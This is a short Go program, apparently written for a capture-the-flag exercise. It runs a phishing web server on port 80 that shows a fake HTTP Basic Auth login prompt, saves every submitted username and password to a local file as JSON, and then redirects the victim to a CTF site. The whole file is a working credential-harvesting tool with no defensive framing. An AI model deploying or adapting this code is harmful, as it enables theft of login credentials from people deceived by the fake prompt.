package main

import (
	"encoding/json"
	"log"
	"net/http"
	"os"

	"github.com/gorilla/mux"
)

func main() {
	// Creating the log file
	CreateLog()

	// Creating the mut router for routing
	router := mux.NewRouter()

	// Phishing HTTP Auth
	router.HandleFunc("/", Phishing)

	// Creating our web application
	log.Fatal(http.ListenAndServe(":80", router))
}

type Credentials struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

func Phishing(w http.ResponseWriter, r *http.Request){
	if username, password, ok := r.BasicAuth(); ok {
		cred := &Credentials{Username: username, Password: password}
		file, err := os.OpenFile("credsentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil { log.Fatal(err) }
		defer file.Close()
		json.NewEncoder(file).Encode(cred)
		http.Redirect(w, r, "https://ctf.tvmglobal.com:43242/", http.StatusMovedPermanently)
	} else {
		w.Header().Add("WWW-Authenticate", "Basic realm='Restricted Area'")
		w.WriteHeader(http.StatusUnauthorized)
	}
}

func CreateLog() {
	file, err := os.OpenFile("logs/runtime.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil { log.Fatal(err) }
	log.SetOutput(file)
	log.Print("Logfile created")
}